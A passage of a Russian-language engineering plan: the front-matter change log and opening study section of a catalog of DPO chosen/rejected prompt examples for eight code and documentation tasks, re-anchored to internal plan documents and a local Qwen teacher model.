---
artifact: active-codex-execution-dpo-prompt-examples-catalog
single_owner_dpo_prompt_examples_catalog: true
owner_role: КАТАЛОГ примеров промптов (DPO positive/negative) под 8 задач — единый владелец
mode: PLAN-ONLY
catalog_is_plan_content_not_capability: true
pass: PE-1 skeleton done (study + схема + карта); PE-2 заполнил Задачу 1 «Оркестрация»; PE-3 заполнил Задачу 2 «Переводы»; PE-4 заполнил Задачу 3 «Серверный код»; PE-5 заполнил Задачу 4 «Клиентский код (Angular)»; PE-6 заполнил Задачу 5 «Серверная документация»; PE-7 заполнил Задачу 6 «Клиентская документация (Angular)»; PE-8 заполнил Задачу 7 «Хранимые процедуры (SQL)»; PE-9 заполнил Задачу 8 «HTML-CSS (44.DesignConversionDomain / FigmaToCode)» — ВСЕ 8 типов заполнены; PE-10 КОНСОЛИДАЦИЯ ВЫПОЛНЕНА (G1–G6: DpoTrainReady-матрица 8×false, name-reconciliation no-dual-canon, carrier-mismatch реестр, LegScope-резидуалы, SI_GATE-покрытие, привязка WO-M1.1/Ф3 + roll-up долгов; catalog≠capability); FIX-RES-1 (Opus 4.8, 2026-07-14) — вписаны 7 РАЗРЕШЁННЫХ резидуалов (A1 задача 6 Angular-док + A2 задача 7 SQL + A3 задача 8 HTML-CSS = `RESOLVED_FROM_DOCUMENTED_AUTHORITY` в G4; B1 hosted acceptance number = `RESOLVED_BY_LUBA_LIVE` 0.90 + нота-риск в §4 п.6/G6/07-файле; B2 эхо-судья-замена + B3 SP-capability + B4 TS-baseline = формализация долгов в §4/G1/G6); DpoTrainReady 8×false / счётчики / `PLAN_NOT_READY` НЕ тронуты; NARROWED-остаток `paid-domain common leg` сохранён opt-in Luba
pass_pe2_fill: PE-2 (Opus 4.8) — Задача 1 Оркестрация ЗАПОЛНЕНА (6 блоков; 5 канонических ORCH-негативов; DpoTrainReady=false условно G-DPO-FINAL); счётчики/readiness НЕ тронуты; FC-44 sweep: §5.2 строка + этот header в одном шаге
pass_pe3_fill: PE-3 (Opus 4.8) — Задача 2 Переводы ЗАПОЛНЕНА (6 блоков; кейс HE_EN; 3 канонических RAG-03-негатива mistranslation/omission/literal_calque + 2 честных доменно-локальных language_leak/number_format_loss; SET-BASED overlap>0.60→discard с каветой runtime 0.50; DpoTrainReady=false по ТОКЕНАЙЗЕРУ Phase-0 + синтетике + G-DPO-FINAL; Hebrew=0-pair дыра честно сеется; асимметрия учитель-читает/студент-TOKENIZER_BLOCKED); счётчики/readiness НЕ тронуты; FC-44 sweep: §5.2 строка + этот header в одном шаге
pass_pe4_fill: PE-4 (Opus 4.8) — Задача 3 Серверный код (.NET Xiigen.*) ЗАПОЛНЕНА (6 блоков; якорь `MarketplaceService.PublishListingAsync`; 5 доменно-локальных DNA-негативов dna_throw_for_business_logic/dna_null_or_bare_bool_return/dna_concrete_dependency_bypass/dna_missing_tenant_isolation/dna_non_idempotent_create — КАЖДЫЙ с явным родителем-классом PromptError-02 No DNA Safety + осью скорера RAG-07; канон-переключение против образца Fable: PromptError-каноника как РОДИТЕЛЬ, RAG-07-рубрики как ОСЬ СКОРЕРА, не как код негатива — single-owner FC-44; доменный CODE-OVERLAP гейт >0.75 discard после вычитания frame, нижней границы нет; DpoTrainReady=false [условно от M1 + G-DPO-FINAL] — доменного Phase-0-блока НЕТ, но G-DPO-FINAL + отсутствие builder держат false; лицензии VERIFIED: SWE-BENCH/NESTJS MIT training-ok ядро, GOOGLE-AIP CC-BY-4.0 attribution, OWASP-ASVS CC-BY-SA-4.0 share-alike→карантин; независимый spot-read .NET богаче образца: подтверждён TenantContext.TenantId + 4-й guard FlowId + DataProcessResult=класс-НЕ-enum); счётчики/readiness НЕ тронуты; FC-44 sweep: §5.2 строка + этот header в одном шаге
pass_pe5_fill: PE-5 (Opus 4.8) — Задача 4 Клиентский код (Angular xiigen-flows) ЗАПОЛНЕНА (6 блоков; якорь живой `submitRegistration()` FLOW-01 `app.ts:98–:101` + template-кнопка `data-testid="submit-registration"` `app.html:57`; 5 негативов = 3 доменно-локальных Angular-кода `ng_unmanaged_subscription_leak`/`ng_http_in_component_service_bypass`/`ng_untyped_any_boundary` — КАЖДЫЙ с явным родителем-классом `PromptError-02 No DNA Safety` (критический) + 2 канонических RAG-07 rubric-имени `secretPresenceArbiter` (CWE-798)/`idempotentCreateArbiter` (клиентская половина) как ОСЬ СКОРЕРА, не код негатива — single-owner FC-44; клиентский CODE-OVERLAP гейт >0.75 discard после вычитания frame [двух-текстовый юнит `.ts`+`.html`], нижней границы нет; LegScope=`PersonalAdaptive` — Paid=Angular по сплиту RAG-02, НЕ free-common (отличие от common-кандидата сервера PE-4); DpoTrainReady=false [условно от M1 + G-DPO-FINAL] с ЧЕСТНЫМ split — «форма компонента» (signals/standalone/control-flow/RTL/a11y) жива, «API-wiring» (HttpClient/RxJS/сервис) = SYNTHETIC_SEED; counted spot-read: 0 HttpClient/`@angular/common/http`/rxjs-import/`subscribe(`/`provideHttpClient`/`takeUntilDestroyed` по всем 47 клиентам, 47 файлов используют `signal()`; 188 non-spec .ts = 47×default-shell (main/app/app.routes/app.config), 47 .spec.ts, 235 всего, 0 feature-компонентов/сервисов — богаче образца-Fable; лицензии VERIFIED живым grep: NIST-SSDF public-domain, GOOGLE-AIP CC-BY-4.0, REACT-ADVANCED реестр CC-BY-4.0 (:409) vs дедуп CC-BY-4.0/MIT (:839) → строжайшая трактовка, ANGULAR-DOCS вне реестра (:653) VERIFY_BEFORE_USE); счётчики/readiness НЕ тронуты; FC-44 sweep: §5.2 строка + этот header в одном шаге
pass_pe6_fill: PE-6 (Opus 4.8) — Задача 5 Серверная документация (`42.ProjectWikiDomain` `project_documentation_pipeline` над .NET) ЗАПОЛНЕНА (6 блоков; якорь-СУБЪЕКТ = живой `MarketplaceService.PublishListingAsync` [PE-4-контракт, кросс-задачная симметрия улучшить-код↔задокументировать-код]; positive = 8-секционный evidence-grounded wiki-док живого шаблона `DocumentationGeneratorUnit`; 5 негативов = 1 доменно-локальный КРИТИЧЕСКИЙ `doc_hallucinated_claim` [false-presence, THE-дефект `hallucination_rate=0.68`] + 4 канонических `ORCH-02`/`PromptError-11`/`PromptError-09`/`PromptError-12`; ГЛАВНОЕ counted-открытие перепроверено live-read: таксономия `DocumentationGeneratorDpoGenerator` = 10 rejected-веток [9 `missing_*` + `partial_documentation`] ВСЕ omission/false-absence, 0 false-presence — hallucination-класс ОТСУТСТВУЕТ, а false-presence watch-сигналы `invented_callee`/`wrong_project_evidence` заперты в сиблинг-юнитах CodeTraceBuilder/EntityImpactMapper [`RAG-02` :253–:254]; ось скорера = evidence-grounding дифференциал ПЕРВИЧНО, doc-overlap 0.75 вторично; EVIDENCE-GROUNDING гейт; все 6 `ExcludedLeakageSignals` [образец-Fable терял `source_id`]; flip `DpoTrainReady` `true→false` [условно от M1 + G-DPO-FINAL] против образца-Fable, с уникальной нотой «единственный домен с живым DPO-генератором И измеренным ПРОВАЛЬНЫМ baseline `0.286`/`0.68`»; LegScope=`common`-кандидат Free=.NET [`RAG-02` :18, обратно к серверу PE-4], privacy `.xiigen`; acceptance-trap `DocumentationGeneratorOutput.Confidence` self-report≠приёмка; honest method-anchor downgrade — контракт через PE-4 in-file, xiigen-файл ЭТИМ пассом НЕ перечитан); счётчики/readiness НЕ тронуты; FC-44 sweep: §5.2 строка + этот header в одном шаге
pass_pe7_fill: PE-7 (Opus 4.8) — Задача 6 Клиентская документация (`42.ProjectWikiDomain` `project_documentation_pipeline` над Angular) ЗАПОЛНЕНА (6 блоков; тот же doc-конвейер, что PE-6, но документируемый СУБЪЕКТ = живой Angular-компонент FLOW-01, якорь `App.submitRegistration()` `app.ts:98–:101`; positive = evidence-grounded 8-секционный wiki-док СТАТИЧЕСКОЙ реальности с absence-evidence «imports без HttpClient + survey 47 клиентов = 0 хитов»; ГЛАВНАЯ доменная ловушка — UI-строка `:100` «verification email … queued» при 0 сетевых вызовов в коде → док про HTTP/POST = галлюцинация BY CONSTRUCTION; 5 негативов = 3 доменно-локальных [**N1 `doc_hallucinated_claim` false-presence — переиспользован из PE-6 БЕЗ переименования, no dual-canon; N4 `doc_omitted_behavior_false_absence` — НОВЫЙ явный код, ЗЕРКАЛО-контраст к N1, замалчивает реальный side-effect `message.set`→`role=status`; N5 `doc_wrong_framework_terminology` — ось «терминология фреймворка» строки 6, сплит AngularJS↔Angular**] + 2 канонических `ORCH-02 Missing Evidence`/`PromptError-11 Vague`; EVIDENCE-GROUNDING гейт РАСШИРЕН до БИНАПРАВЛЕННОГО: unsupported-claim [false-presence] + uncovered-fact [false-absence], по одной форме на каждое направление; LegScope=`PersonalAdaptive` [Paid=Angular по сплиту «механика-конвейера=Free .NET / документируемые СТРОКИ=Paid Angular», ОТЛИЧИЕ от common-кандидата сервера PE-6]; **flip `DpoTrainReady` `true→false` [условно от M1 + G-DPO-FINAL] против образца-Fable — наш канон требует `false` для ВСЕХ задач до `G-DPO-FINAL`, иначе `dual-live-canon` статуса готовности [FC-44]**; baseline `0.286`/`0.68` на Angular НЕ переносится [.NET-корпус; TS PENDING, Multi-Language English promoted]; acceptance-trap: `DocumentationGeneratorOutput.Confidence` меряет ЗАПОЛНЕННОСТЬ секций, слеп к false-presence — N1 даёт тот же Confidence, что хороший док; счётчики/readiness НЕ тронуты; FC-44 sweep: §5.2 строка + этот header в одном шаге; независимый counted spot-read ЭТИМ пассом [богаче образца-Fable]: 47 client-dirs, 0 хитов `HttpClient|.subscribe(|FormBuilder|takeUntilDestroyed|@angular/common/http|from 'rxjs'` [одним объединённым grep], 47 файлов `signal()`, `app.ts` 169 строк / `app.html` 148 строк, `@angular/core ^21.2.0`/`rxjs ~7.8.0`/`typescript ~5.9.2`; live re-read `DocumentationGeneratorUnit`/`ProjectWikiDomainModels`/`DocumentationGeneratorDpoGenerator`/`ProjectLocalWikiModelUnit`; carrier-mismatch VERIFIED — TS-версия едет в поле `CSharpLanguageVersion` `:1570` записи `ProjectDocumentationUnit` [15 полей :1561–:1576], кандидат PE-10; все 6 `ExcludedLeakageSignals` [образец-Fable терял `source_id`])
pass_pe8_fill: PE-8 (Opus 4.8) — Задача 7 Хранимые процедуры (SQL) ЗАПОЛНЕНА (6 блоков; тип = КОД-задача сгенерировать/улучшить процедуру, якорь = живой синтетический SP-контракт генератора `dbo.GetOrderTotals0` `BuildStoredProcedureUnits :293–:327`; **ГЛАВНЫЙ ЧЕСТНЫЙ ДОЛГ §4 п.1 отработан СОБСТВЕННЫМ counted spot-scan ЭТИМ пассом — VERIFIED: 0 реальных `CREATE PROC(EDURE)` определений и 0 tracked `*.sql` во ВСЕХ 5 доступных репо (flows/flows-Dpo/platform/platform-Dpo/llm_mvp_core), `find -iname *.sql` = 0 файлов, DbContext в flows = 0; текстовые хиты — только живая абстенция `ABSTAIN_NO_SOURCE` `SmartWikiServiceTests.cs:140–:141` (×2 platform) + синтетические тест-фикстуры `ProjectWikiDomainTests.cs:2532,:2613` (×2 llm_mvp_core); образцовый репо `xiigen mvp` с `outbox.schema.sql` на машине ОТСУТСТВУЕТ → CITED-not-verified, вывод «0 SP» усилен**; SOURCE_STATUS = `SYNTHETIC_SEED`-forward (легально в код-домене; поза платформы для БД-процедур = `ABSTAIN_NO_SOURCE`); ЖИВОЙ мост VERIFIED полным re-read: SP-промпт 5 must_include-осей :66–:71, SQL-omission-таксономия :85–:94, батч-маршрутизация :194–:257, синтетический корпус :293–:327; positive = bounded teacher-call plan-09 §Шаг 3a + `Y_goal` строго в контрактной рамке (identity/params byte-exact/явный result set/bounded side-effects/idempotent audit в TRY-CATCH) + student-проекция; 5 негативов = **пара false-presence↔false-absence: N1 `sql_hallucinated_parameter` НОВЫЙ доменно-локальный (объявляет @RegionCode вне контракта; зеркало живого `missing_sql_parameters`) ↔ N2 `missing_sql_side_effects` ЖИВОЙ канон-код :89–:90 переиспользован БЕЗ переименования (descriptive `sql_omitted_side_effect` мапится на живой канон, FC-44 no-dual-canon)** + N3 `sql_injection_unsafe_concat` доменно-локальный security (RAG-07 `sqlInjectionArbiter` = ОСЬ СКОРЕРА, не код) + N4 `ORCH-02 Missing Evidence` (чтение из необъявленного `dbo.OrderArchive`) + N5 `PromptError-11 Vague` (заглушка SELECT 1/TODO); каждый ровно ОДНА ошибка `[WRONG:]`, непересекающиеся дифф-регионы; DPO-pair-readiness 14 полей + fan-out 5 пар winner-vs-each-loser + обе проекции chosen/rejected + grounding-гейт ПЕРВИЧНО + reward логпроб-margin plan-07 :341–:360 + SQL-OVERLAP >0.75→discard (frame=CREATE PROCEDURE+контракт схемы) + все 6 `ExcludedLeakageSignals` (образец-Fable терял `source_id`, нёс внеканонные `connection_string`/`database_server_name` — у нас это secretPresence-карантин, НЕ 7-й сигнал); **flip `DpoTrainReady` `true→false` [условно от M1 + G-DPO-FINAL]** против образца-Fable — Phase-0-блока TOKENIZER нет (T-SQL латиница), но false держат [условно от M1 нет builder/scorer/парсера] + [нет REAL-корпуса → SYNTHETIC_SEED source-кавета] + [G-DPO-FINAL]; LegScope=`PersonalAdaptive` (Paid=SQL RAG-02 :18 + consent-обострение `ISqlConsentGate` DENY); гейты честности (acceptance-independence scorer≠trained_unit_self_confidence, Confidence-ловушка `flags.Count/flags.Length` слепа к N1/N4; catalog≠capability учитель НЕ вызывался/SP НЕ исполнялась/0 БД; SYNTHETIC_SEED помечен честно); счётчики/readiness НЕ тронуты; FC-44 sweep: §5.2 строка + §4 п.1 + этот header в одном шаге
pass_pe9_fill: PE-9 (Opus 4.8) — Задача 8 HTML-CSS (`44.DesignConversionDomain` / FigmaToCode design→код) ЗАПОЛНЕНА (6 блоков; тип = КОД-задача улучшить сгенерированный HTML+CSS фрагмента макета, якорь = живой IR-контракт FigmaToCode `Element/Style` + живые контракты 44; **counted spot-read живых типов ЭТИМ пассом VERIFIED**: `IDesignConversionImproverUnit : ILogicalUnit<...>` `DesignConversionUnitContracts.cs:41–:44`, `VisualVerdict`/`VisualDefect`/`ImprovementCandidate{Html,Css}` `DesignConversionContracts.cs:95–:139`, DPO-margin `Chosen.Verdict.Score−Rejected.Verdict.Score` `DesignConversionDpoGenerator.cs:273`, FigmaToCode `Element`/`Style` IR `models/Element.ts:4–:23`+`Style.ts:3–:10`, лицензия ISC `package.json:5`, XSS-вектор raw `containingString` `element-code.ts:130–:151`; **ГЛАВНЫЙ ЧЕСТНЫЙ ДОЛГ §4 п.3 = ЭХО-СУДЬЯ Phase-0 ОТРАБОТАН + VERIFIED spot-read**: `critic.Confidence == verdict.Score` `DesignConversionTrainedUnits.cs:47` (verdict.Score = `verdicts.Min(Score)` :82, простая агрегация не обучение) И `improver.Confidence == input.CriticVerdict.Score` :250 И `Accepted == input.CriticVerdict.Passed` :235, внешний visual-judge НЕ сконфигурирован `NoConfiguredVisualJudge`→0.0 blocked `DesignConversionVisualJudge.cs:376+`, `PassesGate:false` `DesignConversionMachine.cs:125`, синтетический baseline :1115, Route B пуст, 0/10 e2e; positive = bounded teacher-call plan-09 §Шаг 3a + `Y_goal` в полной контрактной рамке дизайна (семантика/доступность/адаптив auto-layout→flex/полнота IR/escape) + student-проекция; 5 негативов = **3 доменно-локальных `dcm_*` [N1 `dcm_xss_unsanitized_markup` security text-only-карантин, родитель security, канонического RAG-07 XSS-арбитра НЕТ; пара false-presence↔false-absence: N2 `dcm_uncovered_ir_node` false-absence (узел IR потерян, родитель = живой coverage/`missing_element`) ↔ N3 `dcm_hallucinated_element` false-presence (элемент не из IR, зеркала в живой таксономии НЕТ)]** + 2 канонических (`ORCH-02 Missing Evidence`, `PromptError-11 Vague`); каждый ровно ОДНА `[WRONG:]`, непересекающиеся дифф-регионы, no dual-canon FC-44; DPO-pair-readiness 14 полей + fan-out 5 пар winner-vs-each-loser + обе проекции chosen/rejected + **REWARD-SCALARIZATION ОБЯЗАТЕЛЬНА (SI_GATE_3, не-скалярный html+css): `reward(side)=Beta·(policyLogP(Norm(Serialize(html+css))|ctx)−referenceLogP(…))` для DPO-margin + `Q_struct(side)=w_sem·structural_fidelity+w_sty·style_fidelity+w_a11y·a11y+w_sec·security−w_norm·markup_normalization_penalty` eval-only для Y_best-selection; ось `VisualVerdict.Score` ИСКЛЮЧЕНА из обоих до Phase-0 (эхо)** + markup-нормализация `Norm()` (attribute-order/whitespace/CSS-property-order/tag-синоним) ПЕРЕД overlap И reward — прайм-вектор reward-hacking разметки + MARKUP-OVERLAP `>0.75→discard` после вычитания frame + LOW_CONTRAST overlap≥0.60/margin≤0.05 + все 6 `ExcludedLeakageSignals`; **`DpoTrainReady=false` держит §4 п.3 (эхо-судья), не только G-DPO-FINAL — ЕДИНСТВЕННЫЙ код-домен каталога с настоящим Phase-0-блоком в арбитре приёмки**; LegScope=`common`-кандидат (HTML+CSS вне платного RAG-02; FigmaToCode ISC + первопартийный 44) с user-макет→PersonalAdaptive каветой; гейты честности (acceptance-independence scorer≠trained_unit_self_confidence И ≠echo_judge_constant SI_GATE_7; catalog≠capability учитель НЕ вызывался/рендер НЕ запускался/юнит НЕ обучен; XSS text-only teaching-negative НЕ исполняется; markup-reward-hack предотвращён нормализацией); счётчики/readiness НЕ тронуты; FC-44 sweep: §5.2 строка + §4 п.3 + этот header в одном шаге
pass_pe10_consolidation: PE-10 (Opus 4.8) — КОНСОЛИДАЦИЯ ВЫПОЛНЕНА (cross-catalog sweep, НЕ новая задача); секция «КОНСОЛИДАЦИЯ PE-10/10» добавлена в конец файла с 6 гейтами: G1 DpoTrainReady-матрица 8 задач = ВСЕ false (no dual-live-canon статуса готовности FC-44; задача 8 держится §4 п.3 эхо-судьёй + G-DPO-FINAL, остальные 7 = G-DPO-FINAL [±M1/токенайзер/SYNTHETIC_SEED]); G2 name-reconciliation свод всех негативов 8 задач (канонические ORCH-01/02/03/08/09, PromptError-09/11/12, RAG-03-коды; RAG-07-рубрики = ОСЬ СКОРЕРА не код; доменно-локальные dna_*×5/ng_*×3/doc_*×3/sql_*×2/dcm_*×3; переиспользованы БЕЗ переименования missing_sql_side_effects[живой канон]/doc_hallucinated_claim[PE-6→PE-7]; FC-44 no-dual-canon = PASS, родительские оси названы; расхождение с образцом-Fable [он: живые коды 44 semantic_layout_hierarchy/responsive/missing_element; мы: dcm_*] — оба FC-44-чисты); G3 carrier-mismatch реестр (главный: `CSharpLanguageVersion` :1570 несёт TS-версию в 15-полевом `ProjectDocumentationUnit` :1561–:1576, PE-7 VERIFIED) = наблюдения для code-repair backlog, НЕ починка (PLAN-ONLY); G4 LegScope-резидуалы (LUBA_PRODUCT_DECISION_RESIDUAL: задача 6 клиент-документация Angular, задача 7 SQL, задача 8 HTML-CSS common↔PersonalAdaptive; common-кандидаты 3/5/[1,2 по умолчанию]; PersonalAdaptive задача 4) [SUPERSEDED by FIX-RES-1 2026-07-14: G4 задачи 6/7/8 → RESOLVED_FROM_DOCUMENTED_AUTHORITY, см. `pass_residual_resolution` + G4]; G5 SI_GATE-покрытие (SI_GATE_4 fan-out + SI_GATE_7 acceptance-independence = ВСЕ 8; SI_GATE_3 reward-scalarization generic §1.3 п.5 для всех структурных + явный `Q_struct` только задача 8; SI_GATE_1/2/6 single-owner/owner-pointer/Y_best-классификация; SI_GATE_5 order-carrier — задача 1, N/A-с-причиной для не-последовательностных; SI_GATE_8/9/10 = владельцы plan-07/08, каталог НЕ перелочивает пороги — корректно; дыр нет); G6 привязка WO-M1.1 (ЧЕСТНО: литерал `WO-M1.1` = внутренний forward-pointer каталога, grep по папке = 0 hits вне каталога → CITED-not-verified; реальный хребет = Ф3 `GraphDpoBuilder`/`TrainableGraphDpoBuilderUnit` [`IGraphDpoPairBuilderUnit`], владелец plan-07 §3.3/§3.5, доска Ф3.1.1, VERIFIED; каталог = входной seed-корпус `GraphDpoSourceRow`-материала) + roll-up §4 долгов (ОТРАБОТАНО: п.1 SQL-корпус PE-8 VERIFIED, п.3 эхо-судья PE-9 VERIFIED; ОСТАЮТСЯ: п.2 токенайзер/иврит 0-pair + baseline TS PENDING, п.4 doc baseline TS не переносится, п.5 client API-wiring SYNTHETIC_SEED, п.6 G-DPO-FINAL/hosted acceptance number, эхо-судья ЗАМЕНА = code-repair, SP-генерация capability) + catalog≠capability (0 учителей вызвано, 0 пар построено, 0 юнитов обучено); счётчики WO 53/решения 26/ветки 55/связи 21/M5=46 НЕ тронуты; readiness `PLAN_NOT_READY` НЕ тронут; FC-44 sweep: строка §5.2 «Консолидация» NOT_STARTED→ЗАПОЛНЕНО + front-matter `pass`/`pass_pe10_consolidation` + секция консолидации — в ОДНОМ шаге; mojibake=0
pass_residual_resolution: FIX-RES-1 (Opus 4.8, 2026-07-14) — вписаны 7 разрешённых резидуалов (Fable предложил, Opus-родитель валидировал VERIFIED-опоры, Luba одобрила применение), анализ НЕ переоткрывается. A1 (задача 6 Angular-док) / A2 (задача 7 SQL) / A3 (задача 8 HTML-CSS) в G4 = `LUBA_PRODUCT_DECISION_RESIDUAL` → `RESOLVED_FROM_DOCUMENTED_AUTHORITY` (прежний статус помечен historical/pre-resolution рядом, no stale-status-carrier); B1 hosted acceptance number Q-TP-235B-EVAL narrowed → `RESOLVED_BY_LUBA_LIVE` 2026-07-14 (`HeldOutAccuracy(Y_goal_TP2) >= 0.90` = порог `generic_documentation_qa_accuracy`) + нейтральная нота-риск для исполнителя; B2 эхо-судья-замена (задача 8) = формализация как code-repair вне каталога (`Q_struct`-скорер-арбитр `IDesignConversionCriticUnit : ILogicalUnit` в L5 `DesignConversionMachine`, Route B → `11.DPO/DpoTrainer`, борд-строка под `REAL_TRAINER_ROUTE_B_GATE`); B3 SP-capability (задача 7) = формализация цепочки разблокировки; B4 TS-baseline (задача 6) = определение задачи ИЗМЕРЕНИЯ. FC-44 sweep в ОДНОМ шаге: G4 + G1 + §4 (п.1/п.3/п.4/п.6) + G6(б) + §5.2-нота + front-matter `pass`/`pass_residual_resolution` + зеркало в 07-execution-gates (`Q-TP-235B-EVAL`). NARROWED-остаток `paid-domain common leg` (non-blocking, opt-in Luba) сохранён для A1/A2. Счётчики (`WO 53`/`решения 26`/`ветки 55`/`связи 21`/`M5=46`) / `DpoTrainReady` 8×false / `PLAN_NOT_READY` НЕ тронуты; mojibake=0
author: Opus 4.8 (Ultracode), bounded architect-author, проход PE-1
authority: живая unquoted-директива Luba 2026-07-13 — внести в НАШ план (dpo legal build) примеры промптов positive/negative под КАЖДУЮ из 8 задач, «в соответствии с реализацией», переносом из плана-источника с переякориванием на наш канон
source_catalog: "C:/Projects/xiigen-planning/llm mvp/visual studio & visual studio code continue/PLAN-VS-VSCODE-CONTINUE-v1.md" (секция «Каталог примеров промптов», :3998–:4130; заполненные проходы PE-4 :4472, PE-9 :5711)
canon_owners_reanchored:
  - GraphDpoPair 14 полей = active-codex-execution-plan-07-dpo-builder.md §3.2 (:232–:261 текст, :887–:901 record)
  - reward-scalarization (logprob-margin) = plan-07 :341–:360; LOW_CONTRAST overlap>=0.60 = plan-07 :520
  - TeacherProvenance 20 полей = plan-08 §3.1 (:389–:409)
  - профиль teacher Этапа 1 qwen35-local-v1 = plan-08 §3.5.2 (:779–:833)
  - двухэтапный teacher-контракт Шаг 3a = plan-09 §Шаг 3a (:492–:502); acceptance-signal independence + Y_best authority (:504–:541)
  - этапы TP1_LOCAL/TP2_HOSTED + Y_best-детерминизм = active-codex-execution-two-phase-local-remote-overlay.md (:11,:48–:53,:77–:93,:242–:254)
counters_unchanged: WO 53 / решения 26 / ветки 55 / связи 21 / M5=46 — каталог их НЕ двигает (plan-content, не work-order)
readiness_unchanged: PLAN-ONLY; PLAN_NOT_READY плана НЕ трогается; второй канон НЕ создаётся — каталог только ССЫЛАЕТСЯ и ПРОЕЦИРУЕТ
git: НЕ коммитить (ветка main, коммитит Luba)
mojibake_scan: clean UTF-8 (проверено readback-грепом; CP1252/UTF-8 corruption-маркеры и U+FFFD отсутствуют)
---

# Каталог примеров промптов (DPO positive/negative) под 8 задач — единый владелец

**По-человечески (для Luba).** Этот файл — новый ЕДИНЫЙ владелец каталога обучающих
примеров промптов для нашего DPO-build (`dpo legal build`). Он материализует
требование R-10 (внешняя legal-модель-учитель обучает нашу внутреннюю from-scratch
модель-студента через DPO) на уровне КОНКРЕТНЫХ пар «хороший промпт / плохой промпт»
(chosen/rejected) под каждую из 8 задач, которые расширения VS/VS Code будут гонять
через конвейер стадий. Проход PE-1 (этот файл) даёт три вещи: (1) **study** — как по
нашей реализации правильно промптовать локального учителя Qwen3.5-9B и обучаемого
студента, и как устроена наша DPO-пара; (2) **СХЕМУ** — 6-блочный шаблон одного
примера, одинаковый для всех 8 задач; (3) **КАРТУ** — какая задача садится на какой
реальный домен/код + честные долги, где данных мало. Сами заполненные примеры пишут
проходы PE-2..PE-9 (по одной задаче на проход), консолидацию — PE-10.

**Границы честности этого прохода (claim boundary).** Каталог = СОДЕРЖИМОЕ ПЛАНА
(образцы обучающих промптов/данных под будущий DPO-build), НЕ исполнение. В проходе
PE-1: учитель Qwen3.5-9B / Ollama НЕ вызывался; НИ ОДНА `GraphDpoPair` НЕ построена (0
пар); продуктовый код/тесты/git-write НЕ выполнялись; счётчики плана НЕ двигались;
readiness плана (`PLAN_NOT_READY`) НЕ меняется. `catalog != capability`: наличие примера
промпта в плане НЕ является заявлением, что способность обучена. Второго канона нет —
контракт учителя, поля пары, provenance берутся из наших блоков 07/08/09 + overlay
двухфазности, файл только ссылается и проецирует.

**Карта переякоривания (источник → наш канон).** Источник использует внутренние
ярлыки `2PH-2.x/2PH-3.x`. Здесь они переведены на наши блоки (это и есть «перенос с
переякориванием»):

| Метка источника (`2PH-*`) | Смысл | НАШ канон-владелец (file:line) |
|---|---|---|
| `2PH-2.3` bounded teacher-call | учитель видит только 7 полей request, не репозиторий; разделение властей | plan-09 §Шаг 3a (:492–:502); provenance пишет `TeacherProvenanceAdapter` после ответа (:501) |
| `2PH-2.2` бюджет ≤8192 | `max_input_tokens = num_ctx − reserved_output_tokens`, `num_ctx≈8192` | plan-09 §Шаг 3a (:499); plan-08 §3.5.2 `NumCtx ~8192` (:814) |
| `2PH-2.1` temp/K best-of-K | `k_generations=4` (PROPOSED_DEFAULT), `sampling_params+seed`, structured JSON | plan-09 §Шаг 3a (:496–:500); профиль `ServiceMode=plain` plan-08 §3.5.2 (:800) |
| `2PH-2.4` клиент+адаптер | `LocalOllamaTeacherClient` + `TeacherProvenanceAdapter` (детерминированные C#, не LLM) | overlay §5 (`TwoPhaseTeacherRouter`/`LocalOllamaTeacherClient`, :146,:177); plan-09 (:501) |
| `2PH-3.1` выбор chosen | `chosen=Y_goal ⇔ Score(Y_goal)>Score(Y_best)`, иначе `Y_best`; teacher-as-loser запрещён | overlay `ChosenSelectionRule` (:242–:254,:279–:280) |
| `2PH-3.2` независимость приёмки | `acceptance_signal_source != trained_unit_self_confidence`; best-of-K не по self-logprob (SI_GATE_7) | plan-09 (:504–:528,:536–:543) |
| `2PH-3.3` доменный scorer | `IndependentDomainScorer` — детерминированный eval-only пер-доменный судья | overlay (:159,:180,:200); plan-09 §3 Шаг 5 |
| `2PH-3.4` студент ≤3–4B | потолок студента v1 (узкая специализация) | overlay §5-нота студента (сохраняется как ограничение примеров) |
| `блок 07` пара 14 полей | `GraphDpoPair` (ровно 14 полей) | plan-07 §3.2 (:232–:261, record :887–:901) |
| `блок 07` reward | logprob-margin `reward(side)=Beta·(policyLogP−referenceLogP)` | plan-07 (:341–:360); LOW_CONTRAST overlap>=0.60 (:520) |
| `блок 08` provenance | `TeacherProvenance` (20 полей: 13+5+2 RR6) | plan-08 §3.1 (:389–:409) |

Общий grounding в реальном коде (общий для обоих планов, валиден): `44.DesignConversionDomain`,
`FigmaToCode`, датасеты `RAG-01..12` в папке источника — примеры источника уже привязаны
к этому коду с `file:line`; эти якоря СОХРАНЯЮТСЯ (проходы PE-2..PE-9 подтверждают их
живым spot-read).

---

## §1. STUDY-БЛОК: промптинг моделей + механика DPO-пары (переякорено на наш канон)

### §1.1 Как промптовать локального УЧИТЕЛЯ Qwen3.5-9B (по реализации)

По-человечески: учитель — `Qwen3.5-9B` (`Q4_K_M`) в Ollama на Docker Desktop, ЛОКАЛЬНО
(Этап `TP1_LOCAL`, профиль `qwen35-local-v1`, plan-08 §3.5.2 :779–:833). Данные наружу не
уходят (`ExternalDataTransfer=false`, :804). Модель мультиязычна и хорошо держит
structured JSON при низкой стохастике. Отсюда ЖЁСТКИЕ правила формы промпта, которые
каждый пример каталога обязан соблюдать:

1. **Закрытый bounded-запрос (наш plan-09 §Шаг 3a :492–:502).** Учитель видит ТОЛЬКО поля
   request-JSON `{task, target_unit, input_context, current_best_output, requirements,
   wrong_markers, output_schema}`, а НЕ репозиторий. Payload = минимальный node/edge JSON
   (`payload_profile=minimal_node_edge_json_v1`, plan-09 :499). Пример, чей «промпт»
   подразумевает доступ вне этих полей, — невалиден by construction.
2. **Бюджет ≤8192 токена (plan-09 :499; plan-08 §3.5.2 :814).** `max_input_tokens = num_ctx −
   reserved_output_tokens`, `num_ctx≈8192`. Значит, примеры каталога обязаны быть КОРОТКИМИ и
   unit-level (один узел/ребро/файл/функция/фрагмент макета), не «весь проект».
   Превышение → `teacher_context_budget_exceeded` БЕЗ тихой обрезки контекста; факт
   уходит строкой в `self_best`-ветку (goal не строится, plan-09 :499).
3. **Низкая стохастика для structured JSON (plan-09 :496–:500).** `k_generations=4`
   (PROPOSED_DEFAULT, empirically-tunable), каждая генерация со своими `sampling_params+seed`,
   `service_mode=plain` (plan-08 :800). Все K невалидны по JSON-schema →
   `TEACHER_STRUCTURED_OUTPUT_INVALID` → `self_best` (plan-09 :500). Невалидный JSON НЕ
   чинится молча.
4. **Разделение властей (binding).** LLM производит ТОЛЬКО `goal_text` + `improvements` (+
